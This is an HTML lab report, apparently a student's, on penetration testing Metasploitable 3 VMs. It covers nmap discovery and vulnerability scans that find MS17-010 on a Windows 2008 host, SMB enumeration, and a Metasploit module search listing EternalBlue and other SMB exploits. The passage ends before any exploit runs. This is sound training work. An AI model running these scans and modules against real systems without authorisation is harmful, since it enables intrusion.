@@ -1,0 +1,791 @@
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <title>Metasploitable Lab - Jeff Silverman</title>
+    <link rel="stylesheet" type="text/css" href="homepage.css">
+  </head>
+  <body>
+    <h1 style="text-align:center;"><a id="mozTocId645626" class="mozTocH1"></a>Metasploitable</h1>
+    <p style="text-align:center;">Jeff Silverman</p>
+    <p>This report is divided into 2 parts: 1) <a href="#mozTocId511272">an
+        executive overview</a> of the process I used to find the vulnerability
+      and 2) <a href="#mozTocId424837">details of what I did</a>, what I found,
+      and why I came to the conclusions I came to.<br>
+    </p>
+    <h1>Windows Server/2008 (win2K8)</h1>
+    <p>I used the nmap -sn command to find the win2k8 machine by running it
+      once, then turning on the win2K8 machine, running nmap -sn again, and
+      comparing the outputs.&nbsp; The new entry was my victim.</p>
+    <p>I ran nmap with the -A option and I found that the Windows/2008 machine
+      had the vulnerability <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-0143">CVE-2017-0143</a>.&nbsp;
+      This vulnerability has a Common Vulnerability Scoring System (CVSS) score
+      of 8.1, high.</p>
+    <p>I used mfsconsole </p>
+    <p><br>
+    </p>
+    <h1><a id="mozTocId424837" class="mozTocH1"></a>Metasploitable -
+      chronological</h1>
+    <h2><a id="mozTocId803519" class="mozTocH2"></a>April 6th 2022</h2>
+    <p>I am following the guidance of <a href="https://www.youtube.com/watch?v=N_mCHMjP51Q"><yt-formatted-string
+          force-default-style="" class="style-scope ytd-video-primary-info-renderer">Metasploitable
+          3 Lab: Setup, Enumeration, and Exploitation</yt-formatted-string></a>
+      by Jesse k.</p>
+    <h3><a id="mozTocId36977" class="mozTocH3"></a>nmap</h3>
+    <p>Identification.&nbsp; I don't know the IP addresses of these machines.</p>
+    <pre>jeffs@jeffs-desktop:~/Coding_DoJo/metasploitable3-workspace$ <kbd>nmap -sn 192.168.0.1/24</kbd>
+<samp>Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-06 23:53 PDT
+Nmap scan report for local-router (192.168.0.1)
+Host is up (0.0013s latency).
+Nmap scan report for jeffs-desktop (192.168.0.5)
+Host is up (0.00024s latency).
+Nmap scan report for 192.168.0.21
+Host is up (0.0043s latency).
+<b>Nmap scan report for ubuntu (192.168.0.23)</b>
+Host is up (0.00038s latency).
+<b>Nmap scan report for 192.168.0.24</b>
+Host is up (0.0028s latency).
+Nmap scan report for jeffs-desktop (192.168.0.149)
+Host is up (0.00077s latency).
+Nmap scan report for raspberry (192.168.0.159)
+Host is up (0.00042s latency).
+Nmap done: 256 IP addresses (7 hosts up) scanned in 2.32 seconds</samp>
+jeffs@jeffs-desktop:~/Coding_DoJo/metasploitable3-workspace$ 
+</pre>
+    <pre>jeffs@jeffs-desktop:~$ <kbd>nmap -A 192.168.0.23</kbd>
+<samp>Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-06 23:59 PDT
+Nmap scan report for <b>ubuntu</b> (192.168.0.23)
+Host is up (0.00061s latency).
+Not shown: 991 filtered ports
+PORT     STATE  SERVICE     VERSION
+21/tcp   closed ftp
+22/tcp   open   ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 2b:2e:1f:a4:54:26:87:76:12:26:59:58:0d:da:3b:04 (DSA)
+|   2048 c9:ac:70:ef:f8:de:8b:a3:a3:44:ab:3d:32:0a:5c:6a (RSA)
+|   256 c0:49:cc:18:7b:27:a4:07:0d:2a:0d:bb:42:4c:36:17 (ECDSA)
+|_  256 a0:76:f3:76:f8:f0:70:4d:09:ca:e1:10:fd:a9:cc:0a (ED25519)
+80/tcp   open   http        Apache httpd 2.4.7 ((Ubuntu))
+| http-ls: Volume /
+| SIZE  TIME              FILENAME
+| -     2020-10-29 19:37  chat/
+| -     2011-07-27 20:17  drupal/
+| 1.7K  2020-10-29 19:37  payroll_app.php
+| -     2013-04-08 12:06  phpmyadmin/
+|_
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Index of /
+445/tcp  open   netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+631/tcp  open   ipp         CUPS 1.7
+| http-methods: 
+|_  Potentially risky methods: PUT
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: CUPS/1.7 IPP/2.1
+|_http-title: Home - CUPS 1.7.2
+3000/tcp closed ppp
+3306/tcp open   mysql       MySQL (unauthorized)
+8080/tcp open   http        Jetty 8.1.7.v20120910
+|_http-server-header: Jetty(8.1.7.v20120910)
+|_http-title: Error 404 - Not Found
+8181/tcp closed intermapper
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1s, deviation: 2s, median: 0s
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: ubuntu
+|   NetBIOS computer name: UBUNTU\x00
+|   Domain name: \x00
+|   FQDN: ubuntu
+|_  System time: 2022-04-07T06:59:54+00:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2022-04-07T06:59:53
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 50.65 seconds</samp>
+jeffs@jeffs-desktop:~$   
+</pre>
+    <pre>jeffs@jeffs-desktop:~$ <kbd>nmap -A 192.168.0.24</kbd><samp>
+Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-07 00:00 PDT
+Nmap scan report for vagrant-2008R2 (192.168.0.24)
+Host is up (0.0017s latency).
+Not shown: 980 closed ports
+PORT      STATE SERVICE              VERSION
+21/tcp    open  ftp                  Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+22/tcp    open  ssh                  OpenSSH 7.1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 ba:16:aa:1d:e5:73:5a:5a:93:0a:c1:e0:da:35:ae:4e (RSA)
+|_  521 9d:f8:27:2a:8f:3d:b6:a6:e0:2c:ed:17:4d:17:ab:7e (ECDSA)
+80/tcp    open  http                 Microsoft IIS httpd 7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: Site doesn't have a title (text/html).
+135/tcp   open  msrpc                Microsoft Windows RPC
+139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds         Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds
+3306/tcp  open  mysql                MySQL 5.5.20-log
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.5.20-log
+|   Thread ID: 6
+|   Capabilities flags: 63487
+|   Some Capabilities: LongColumnFlag, IgnoreSigpipes, Support41Auth, Speaks41ProtocolOld, InteractiveClient, FoundRows, SupportsCompression, SupportsTransactions, SupportsLoadDataLocal, LongPassword, Speaks41ProtocolNew, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, ODBCClient, DontAllowDatabaseTableColumn, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
+|   Status: Autocommit
+|   Salt: 2EFlqo[Z418eu&lt;gv&lt;dcG
+|_  Auth Plugin Name: mysql_native_password
+3389/tcp  open  ssl/ms-wbt-server?
+|_ssl-date: 2022-04-07T07:02:20+00:00; -1s from scanner time.
+4848/tcp  open  ssl/appserv-http?
+|_ssl-date: 2022-04-07T07:02:20+00:00; -1s from scanner time.
+7676/tcp  open  java-message-service Java Message Service 301
+8080/tcp  open  http                 Sun GlassFish Open Source Edition  4.0
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Site doesn't have a title (text/html).
+8181/tcp  open  ssl/intermapper?
+|_ssl-date: 2022-04-07T07:02:20+00:00; -1s from scanner time.
+<a name="https_8383"><b>8383/tcp  open  ssl/http             Apache httpd</b></a>
+|_http-server-header: Apache
+|_http-title: 503 Service Unavailable
+| ssl-cert: Subject: commonName=Desktop Central/organizationName=Zoho Corporation/stateOrProvinceName=CA/countryName=US
+| Not valid before: 2010-09-08T12:24:44
+|_Not valid after:  2020-09-05T12:24:44
+|_ssl-date: TLS randomness does not represent time
+9200/tcp  open  wap-wsp?
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 400 Bad Request
+|     Content-Type: text/plain; charset=UTF-8
+|     Content-Length: 80
+|     handler found for uri [/nice%20ports%2C/Tri%6Eity.txt%2ebak] and method [GET]
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Content-Type: application/json; charset=UTF-8
+|     Content-Length: 308
+|     "status" : 200,
+|     "name" : "Firelord",
+|     "version" : {
+|     "number" : "1.1.1",
+|     "build_hash" : "f1585f096d3f3985e73456debdc1a0745f512bbc",
+|     "build_timestamp" : "2014-04-16T14:27:12Z",
+|     "build_snapshot" : false,
+|     "lucene_version" : "4.7"
+|     "tagline" : "You Know, for Search"
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Content-Type: text/plain; charset=UTF-8
+|     Content-Length: 0
+|   RTSPRequest, SIPOptions: 
+|     HTTP/1.1 200 OK
+|     Content-Type: text/plain; charset=UTF-8
+|_    Content-Length: 0
+49152/tcp open  msrpc                Microsoft Windows RPC
+49153/tcp open  msrpc                Microsoft Windows RPC
+49154/tcp open  msrpc                Microsoft Windows RPC
+49155/tcp open  msrpc                Microsoft Windows RPC
+49156/tcp open  msrpc                Microsoft Windows RPC
+49157/tcp open  msrpc                Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9200-TCP:V=7.80%I=7%D=4/7%Time=624E8C0C%P=x86_64-pc-linux-gnu%r(Get
+SF:Request,18B,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20application/jso
+SF:n;\x20charset=UTF-8\r\nContent-Length:\x20308\r\n\r\n{\r\n\x20\x20\"sta
+SF:tus\"\x20:\x20200,\r\n\x20\x20\"name\"\x20:\x20\"Firelord\",\r\n\x20\x2
+SF:0\"version\"\x20:\x20{\r\n\x20\x20\x20\x20\"number\"\x20:\x20\"1\.1\.1\
+SF:",\r\n\x20\x20\x20\x20\"build_hash\"\x20:\x20\"f1585f096d3f3985e73456de
+SF:bdc1a0745f512bbc\",\r\n\x20\x20\x20\x20\"build_timestamp\"\x20:\x20\"20
+SF:14-04-16T14:27:12Z\",\r\n\x20\x20\x20\x20\"build_snapshot\"\x20:\x20fal
+SF:se,\r\n\x20\x20\x20\x20\"lucene_version\"\x20:\x20\"4\.7\"\r\n\x20\x20}
+SF:,\r\n\x20\x20\"tagline\"\x20:\x20\"You\x20Know,\x20for\x20Search\"\r\n}
+SF:\n")%r(HTTPOptions,4F,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20text/
+SF:plain;\x20charset=UTF-8\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest
+SF:,4F,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain;\x20charset=
+SF:UTF-8\r\nContent-Length:\x200\r\n\r\n")%r(FourOhFourRequest,A9,"HTTP/1\
+SF:.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=
+SF:UTF-8\r\nContent-Length:\x2080\r\n\r\nNo\x20handler\x20found\x20for\x20
+SF:uri\x20\[/nice%20ports%2C/Tri%6Eity\.txt%2ebak\]\x20and\x20method\x20\[
+SF:GET\]")%r(SIPOptions,4F,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20tex
+SF:t/plain;\x20charset=UTF-8\r\nContent-Length:\x200\r\n\r\n");
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1h09m59s, deviation: 2h51m29s, median: -1s
+|_nbstat: NetBIOS name: VAGRANT-2008R2, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:22:f2:00 (Oracle VirtualBox virtual NIC)
+| smb-os-discovery: 
+|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
+|   Computer name: vagrant-2008R2
+|   NetBIOS computer name: VAGRANT-2008R2\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2022-04-07T00:02:03-07:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2022-04-07T07:02:01
+|_  start_date: 2022-04-07T06:40:04
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 306.08 seconds</samp>
+jeffs@jeffs-desktop:~$ 
+    
+    
+    </pre>
+    <p></p>
+    <h3><a id="mozTocId481628" class="mozTocH3"></a>Ubuntu 14.04</h3>
+    <br>
+    <br>
+    <img src="2022-04-06_23-34_Silverman_Jeff.png" alt="Metasploit 3 " title="Screenshot showing Unbuntu 14.04 up and running"><br>
+    <br>
+    <h3><a id="mozTocId355017" class="mozTocH3"></a>Windows 2K</h3>
+    <br>
+    <br>
+    &nbsp; <img src="2022-04-06_23-43_Silverman_Jeff.png" alt="Metasploit 3" title="Screenshow showing Windows/2008 up and running"><br>
+    <br>
+    <h2><a id="mozTocId406026" class="mozTocH2"></a>April 7<sup>th</sup> 2022</h2>
+    <p> </p>
+    <h3><a id="mozTocId695649" class="mozTocH3"></a>Windows 2K8</h3>
+    <p>This was suggested by <a href="https://www.youtube.com/watch?v=N_mCHMjP51Q">Metasploitable
+        3 lab: Setup, Enumeration, and Exploitation</a>., by Jesse K.</p>
+    <h4><a id="mozTocId283995" class="mozTocH4"></a>Manage Engine Desktop
+      Central 9</h4>
+    <p><a href="#https_8383">The port is clearly shown by nmap</a>.&nbsp; When I
+      try it, I get a 503 error.&nbsp; Something hasn't started properly, Jesse
+      gets a page on ManageEngine Desktop Central 9.&nbsp; There is an icon on
+      the screen to start it.&nbsp; There are also some settings that say MESC9
+      should start at boot time.&nbsp; But it didn't start.&nbsp; <a href="https://github.com/rapid7/metasploitable3/issues/162">The
+        github page on metasploitable 3 has issue 162</a>.&nbsp; To see if this
+      is the same issue, look at port 8022.&nbsp; Port 8022 is closed, so that's
+      not the issue.</p>
+    <p>I looked in the application log file and I see the following:</p>
+    <pre>jeffs@jeffs-desktop:~$ cat /home/jeffs/Coding_DoJo/ElasticSearch_wont_start_2.txt
+System 
+
+  - Provider 
+
+   [ Name]  Application Error 
+ 
+  - EventID 1000 
+
+   [ Qualifiers]  0 
+ 
+   Level 2 
+ 
+   Task 100 
+ 
+   Keywords 0x80000000000000 
+ 
+  - TimeCreated 
+
+   [ SystemTime]  2022-04-07T07:40:13.000000000Z 
+ 
+   EventRecordID 466 
+ 
+   Channel Application 
+ 
+   Computer vagrant-2008R2 
+ 
+   Security 
+ 
+
+- EventData 
+
+   elasticsearch-service-x64.exe 
+   1.0.15.0 
+   51543b9d 
+   jvm.dll 
+   8.0.2110.12 
+   5ca2dd29 
+   c0000005 
+   0000000000218238 
+   5a8 
+   01d84a4a3db56f39 
+   C:\Program Files\elasticsearch-1.1.1\bin\elasticsearch-service-x64.exe 
+   C:\Program Files\Java\jdk1.8.0_211\jre\bin\server\jvm.dll 
+   f55ffa35-b645-11ec-b412-08002722f200 
+jeffs@jeffs-desktop:~$ 
+
+</pre>
+    <p></p>
+    <p><br>
+    </p>
+    <p> </p>
+    <p>Could the fact that elasticsearch is failing cause Desktop Central to
+      fail?&nbsp; I increased the allowed memory size to 8 GBytes, enabled
+      bidirectional copy and paste and bidirectional drag and drop.&nbsp; Then I
+      rebooted.&nbsp; Still has an issue.&nbsp;<span class="important"> I am
+        going to set this aside for now in the interest of saving time</span>.<br>
+    </p>
+    <h4><a id="mozTocId44929" class="mozTocH4"></a>SMB or CIFS</h4>
+    <p>I tried logging in using smbclient.&nbsp; I got an error that SMB1 is
+      disabled - which is the way it ought to be: SMB1 has hopelessly flawed
+      security.</p>
+    <pre>jeffs@jeffs-desktop:~/Coding_DoJo/metasploitable3-workspace$ <kbd>smbclient -L \\\\192.168.0.24</kbd>
+<samp>Enter WORKGROUP\jeffs's password: 
+Anonymous login successful
+
+	Sharename       Type      Comment
+	---------       ----      -------
+SMB1 disabled -- no workgroup available</samp>
+jeffs@jeffs-desktop:~/Coding_DoJo/metasploitable3-workspace$<kbd></kbd>
+
+</pre>
+    <p></p>
+    <h2><a id="mozTocId333779" class="mozTocH2"></a>April 9th</h2>
+    <p>Reading <a href="https://www.youtube.com/watch?v=8lR27r8Y_ik">Metasploit
+        For Beginners - #1 - The Basics - Modules, Exploits &amp; Payloads</a>.</p>
+    <h3><a id="mozTocId867485" class="mozTocH3"></a>Windows 2K8</h3>
+    <h4><a id="mozTocId35306" class="mozTocH4"></a>Running nmap</h4>
+    <pre><font color="#4E9A06">┌──(</font><font color="#729FCF"><b>kali㉿kali</b></font><font
+color="#4E9A06">)-[</font><font color="#EAFB05"><b>~</b></font><font color="#4E9A06">]</font>
+<font color="#4E9A06">└─</font><font color="#729FCF"><b>$</b></font> <font color="#4E9A06">nmap</font> <font
+color="#75507B">-T4</font> <font color="#75507B">-A</font> <font color="#75507B">--script=smb-vuln</font><font
+color="#729FCF"><b>*</b></font> <font color="#75507B">-p</font> 139,445 <font color="#75507B">-oN</font> <u
+style="text-decoration-style:single">smb_script_scan.txt</u> 192.168.0.26
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-10 04:47 EDT
+Nmap scan report for vagrant-2008R2 (192.168.0.26)
+Host is up (0.00064s latency).
+
+PORT    STATE SERVICE      VERSION
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  <b>CVE:CVE-2017-0143</b>
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.48 seconds
+                                                                                                       
+<font color="#4E9A06">┌──(</font><font color="#729FCF"><b>kali㉿kali</b></font><font
+color="#4E9A06">)-[</font><font color="#EAFB05"><b>~</b></font><font color="#4E9A06">]</font>
+<font color="#4E9A06">└─</font><font color="#729FCF"><b>$</b></font> <font color="#4E9A06">date</font>             
+Sun Apr 10 04:47:24 AM EDT 2022
+                                                                                                       
+                                                                                                       </pre>
+    <h4><a id="mozTocId932987" class="mozTocH4"></a>Running msfconsole</h4>
+    <pre><font color="#4E9A06">┌──(</font><font color="#729FCF"><b>kali㉿kali</b></font><font
+color="#4E9A06">)-[</font><font color="#EAFB05"><b>~</b></font><font color="#4E9A06">]</font>
+<font color="#4E9A06">└─</font><font color="#729FCF"><b>$</b></font> <kbd><font
+color="#4E9A06">msfconsole</font></kbd>          
+                                                  
+<font color="#06989A">...</font>
+
+</pre>
+    <pre><u style="text-decoration-style:single">msf6</u> &gt; <kbd>search smb</kbd>
+<samp>
+Matching Modules
+================
+
+   #    Name                                                            Disclosure Date  Rank       Check  Description
+   -    ----                                                            ---------------  ----       -----  -----------
+   0    exploit/multi/http/struts_code_exec_classloader                 2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
+   1    exploit/osx/browser/safari_file_policy                          2011-10-12       normal     No     Apple Safari file:// Arbitrary Code Execution
+   2    auxiliary/server/capture/<span style="background-color:#75507B">smb</span>                                                     normal     No     Authentication Capture: <span
+style="background-color:#75507B">SMB</span>
+   3    post/linux/busybox/<span style="background-color:#75507B">smb</span>_share_root                                                normal     No     BusyBox <span
+style="background-color:#75507B">SMB</span> Sharing
+   4    auxiliary/scanner/http/citrix_dir_traversal                     2019-12-17       normal     No     Citrix ADC (NetScaler) Directory Traversal Scanner
+   5    auxiliary/scanner/<span style="background-color:#75507B">smb</span>/impacket/dcomexec                         2018-03-19       normal     No     DCOM Exec
+   6    auxiliary/scanner/<span style="background-color:#75507B">smb</span>/impacket/secretsdump                                       normal     No     DCOM Exec
+   7    exploit/windows/scada/ge_proficy_cimplicity_gefebt              2014-01-23       <font
+color="#4E9A06">excellent</font>  Yes    GE Proficy CIMPLICITY gefebt.exe Remote Code Execution
+   8    exploit/windows/<span style="background-color:#75507B">smb</span>/generic_<span
+style="background-color:#75507B">smb</span>_dll_injection                   2015-03-04       manual     No     Generic DLL Injection From Shared Resource
+   9    exploit/windows/http/generic_http_dll_injection                 2015-03-04       manual     No     Generic Web Application DLL Injection
+   10   exploit/windows/<span style="background-color:#75507B">smb</span>/group_policy_startup                        2015-01-26       manual     No     Group Policy Script Execution From Shared Resource
+   11   exploit/windows/misc/hp_dataprotector_install_service           2011-11-02       <font
+color="#4E9A06">excellent</font>  Yes    HP Data Protector 6.10/6.11/6.20 Install Service
+   12   exploit/windows/misc/hp_dataprotector_cmd_exec                  2014-11-02       <font
+color="#4E9A06">excellent</font>  Yes    HP Data Protector 8.10 Remote Command Execution
+   13   auxiliary/server/http_ntlmrelay                                                  normal     No     HTTP Client MS Credential Relayer
+   14   exploit/windows/<span style="background-color:#75507B">smb</span>/ipass_pipe_exec                             2015-01-21       <font
+color="#4E9A06">excellent</font>  Yes    IPass Control Pipe Remote Command Execution
+   15   auxiliary/gather/konica_minolta_pwd_extract                                      normal     No     Konica Minolta Password Extractor
+   16   auxiliary/fileformat/odt_badodt                                 2018-05-01       normal     No     LibreOffice 6.03 /Apache OpenOffice 4.1.5 Malicious ODT File Generator
+   17   post/linux/gather/mount_cifs_creds                                               normal     No     Linux Gather Saved mount.cifs/mount.<span
+style="background-color:#75507B">smb</span>fs Credentials
+   18   exploit/windows/<span style="background-color:#75507B">smb</span>/ms03_049_netapi                             2003-11-11       good       No     MS03-049 Microsoft Workstation Service NetAddAlternateComputerName Overflow
+   19   exploit/windows/<span style="background-color:#75507B">smb</span>/ms04_007_killbill                           2004-02-10       low        No     MS04-007 Microsoft ASN.1 Library Bitstring Heap Overflow
+   20   exploit/windows/<span style="background-color:#75507B">smb</span>/ms04_011_lsass                              2004-04-13       good       No     MS04-011 Microsoft LSASS Service DsRolerUpgradeDownlevelServer Overflow
+   21   exploit/windows/<span style="background-color:#75507B">smb</span>/ms04_031_netdde                             2004-10-12       good       No     MS04-031 Microsoft NetDDE Service Overflow
+   22   exploit/windows/<span style="background-color:#75507B">smb</span>/ms05_039_pnp                                2005-08-09       good       Yes    MS05-039 Microsoft Plug and Play Service Overflow
+   23   exploit/windows/<span style="background-color:#75507B">smb</span>/ms06_025_rras                               2006-06-13       average    No     MS06-025 Microsoft RRAS Service Overflow
+   24   exploit/windows/<span style="background-color:#75507B">smb</span>/ms06_025_rasmans_reg                        2006-06-13       good       No     MS06-025 Microsoft RRAS Service RASMAN Registry Overflow
+   25   exploit/windows/<span style="background-color:#75507B">smb</span>/ms06_040_netapi                             2006-08-08       good       No     MS06-040 Microsoft Server Service NetpwPathCanonicalize Overflow
+   26   exploit/windows/<span style="background-color:#75507B">smb</span>/ms06_066_nwapi                              2006-11-14       good       No     MS06-066 Microsoft Services nwapi32.dll Module Exploit
+   27   exploit/windows/<span style="background-color:#75507B">smb</span>/ms06_066_nwwks                              2006-11-14       good       No     MS06-066 Microsoft Services nwwks.dll Module Exploit
+   28   exploit/windows/<span style="background-color:#75507B">smb</span>/ms06_070_wkssvc                             2006-11-14       manual     No     MS06-070 Microsoft Workstation Service NetpManageIPCConnect Overflow
+   29   exploit/windows/<span style="background-color:#75507B">smb</span>/ms07_029_msdns_zonename                     2007-04-12       manual     No     MS07-029 Microsoft DNS RPC Service extractQuotedChar() Overflow (<span
+style="background-color:#75507B">SMB</span>)
+   30   exploit/windows/<span style="background-color:#75507B">smb</span>/ms08_067_netapi                             2008-10-28       <font
+color="#4E9A06">great</font>      Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
+   31   exploit/windows/<span style="background-color:#75507B">smb</span>/<span
+style="background-color:#75507B">smb</span>_relay                                   2001-03-31       <font
+color="#4E9A06">excellent</font>  No     MS08-068 Microsoft Windows <span style="background-color:#75507B">SMB</span> Relay Code Execution
+   32   exploit/windows/<span style="background-color:#75507B">smb</span>/ms09_050_<span
+style="background-color:#75507B">smb</span>2_negotiate_func_index          2009-09-07       good       No     MS09-050 Microsoft SRV2.SYS <span
+style="background-color:#75507B">SMB</span> Negotiate ProcessID Function Table Dereference
+   33   exploit/windows/browser/ms10_022_ie_vbscript_winhlp32           2010-02-26       <font
+color="#4E9A06">great</font>      No     MS10-022 Microsoft Internet Explorer Winhlp32.exe MsgBox Code Execution
+   34   exploit/windows/<span style="background-color:#75507B">smb</span>/ms10_061_spoolss                            2010-09-14       <font
+color="#4E9A06">excellent</font>  No     MS10-061 Microsoft Print Spooler Service Impersonation Vulnerability
+   35   exploit/windows/fileformat/ms13_071_theme                       2013-09-10       <font
+color="#4E9A06">excellent</font>  No     MS13-071 Microsoft Windows Theme File Handling Arbitrary Code Execution
+   36   exploit/windows/fileformat/ms14_060_sandworm                    2014-10-14       <font
+color="#4E9A06">excellent</font>  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
+   37   exploit/windows/<span style="background-color:#75507B">smb</span>/ms17_010_eternalblue                        2017-03-14       average    Yes    MS17-010 EternalBlue <span
+style="background-color:#75507B">SMB</span> Remote Windows Kernel Pool Corruption
+   38   exploit/windows/<span style="background-color:#75507B">smb</span>/ms17_010_psexec                             2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion <span
+style="background-color:#75507B">SMB</span> Remote Windows Code Execution
+   39   auxiliary/admin/<span style="background-color:#75507B">smb</span>/ms17_010_command                            2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion <span
+style="background-color:#75507B">SMB</span> Remote Windows Command Execution
+   40   auxiliary/scanner/<span style="background-color:#75507B">smb</span>/<span
+style="background-color:#75507B">smb</span>_ms17_010                                               normal     No     MS17-010 <span
+style="background-color:#75507B">SMB</span> RCE Detection
+   41   auxiliary/dos/windows/<span style="background-color:#75507B">smb</span>/ms05_047_pnp                                           normal     No     Microsoft Plug and Play Service Registry Overflow
+   42   auxiliary/dos/windows/<span style="background-color:#75507B">smb</span>/rras_vls_null_deref                   2006-06-14       normal     No     Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference
+   43   auxiliary/admin/mssql/mssql_ntlm_stealer                                         normal     No     Microsoft SQL Server NTLM Stealer
+   44   auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                                    normal     No     Microsoft SQL Server SQLi NTLM Stealer
+   45   auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                            normal     No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
+   46   auxiliary/admin/mssql/mssql_enum_domain_accounts                                 normal     No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
+   47   auxiliary/dos/windows/<span style="background-color:#75507B">smb</span>/ms06_035_mailslot                     2006-07-11       normal     No     Microsoft SRV.SYS Mailslot Write Corruption
+   48   auxiliary/dos/windows/<span style="background-color:#75507B">smb</span>/ms06_063_trans                                         normal     No     Microsoft SRV.SYS Pipe Transaction No Null
+   49   auxiliary/dos/windows/<span style="background-color:#75507B">smb</span>/ms09_001_write                                         normal     No     Microsoft SRV.SYS WriteAndX Invalid DataOffset
+   50   auxiliary/dos/windows/<span style="background-color:#75507B">smb</span>/ms09_050_<span
+style="background-color:#75507B">smb</span>2_negotiate_pidhigh                        normal     No     Microsoft SRV2.SYS <span
+style="background-color:#75507B">SMB</span> Negotiate ProcessID Function Table Dereference
+   51   auxiliary/dos/windows/<span style="background-color:#75507B">smb</span>/ms09_050_<span
+style="background-color:#75507B">smb</span>2_session_logoff                           normal     No     Microsoft SRV2.SYS <span
+style="background-color:#75507B">SMB</span>2 Logoff Remote Kernel NULL Pointer Dereference
+   52   auxiliary/dos/windows/<span style="background-color:#75507B">smb</span>/vista_negotiate_stop                                   normal     No     Microsoft Vista SP0 <span
+style="background-color:#75507B">SMB</span> Negotiate Protocol DoS
+   53   auxiliary/dos/windows/<span style="background-color:#75507B">smb</span>/ms10_006_negotiate_response_loop                       normal     No     Microsoft Windows 7 / Server 2008 R2 <span
+style="background-color:#75507B">SMB</span> Client Infinite Loop
+   54   auxiliary/scanner/<span style="background-color:#75507B">smb</span>/psexec_loggedin_users                                      normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
+   55   exploit/windows/<span style="background-color:#75507B">smb</span>/psexec                                      1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
